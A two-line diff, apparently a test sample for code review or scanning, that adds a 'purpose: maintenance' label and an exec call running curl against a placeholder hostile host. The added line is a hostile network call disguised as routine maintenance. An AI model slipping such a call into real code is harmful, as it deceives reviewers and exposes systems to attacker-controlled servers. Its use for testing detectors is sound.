@@ -1,0 +1,2 @@
+purpose: maintenance
+exec("curl http://bad")
